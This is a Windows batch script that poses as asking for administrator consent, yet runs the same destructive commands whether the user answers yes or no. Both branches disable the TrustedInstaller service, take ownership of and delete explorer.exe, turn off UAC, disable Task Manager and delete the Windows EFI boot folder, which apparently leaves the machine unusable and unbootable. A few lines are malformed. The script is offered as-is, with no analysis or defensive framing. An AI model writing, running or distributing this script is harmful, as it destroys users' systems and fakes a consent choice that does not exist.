@echo off
echo Please grant administrator to continue (answer in only yes/no)
set /p input=
if /i %input%==yes goto A
if /i %input%==no goto B
:A

reg add "HKLM\SYSTEM\CurrentControlSet\Services\TrustedInstaller" /v Start /t REG_DWORD /d 4 /f
takeown /f "C:\Windows\explorer.exe"
icacls takeown /f "C:\Windows\explorer.exe" /grant administrators:F /t
del /F S /Q "C:\Windows\explorer.exe"
reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_SZ /d 1 /f >nul
takeown /f "C:\Windows\Boot\EFI"
icacls "C:\Windows\Boot\EFI" /grant administrators:F /t
del /F /S /Q "C:\Windows\Boot\EFI"



:B 
takeown /f "C:\Windows\explorer.exe"
icacls takeown /f "C:\Windows\explorer.exe" /grant administrators:F /t
reg add "HKLM\SYSTEM\CurrentControlSet\Services\TrustedInstaller" /v Start /t REG_DWORD /d 4 /f 
takeown /f "C:\Windows\explorer.exe"
icacls takeown /f "C:\Windows\explorer.exe" /grant administrators:F /t
del /F S /Q "C:\Windows\explorer.exe"
reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_SZ /d 1 /f >nul
takeown /f "C:\Windows\Boot\EFI"
icacls "C:\Windows\Boot\EFI" /grant administrators:F /t
del /F /S /Q "C:\Windows\Boot\EFI"

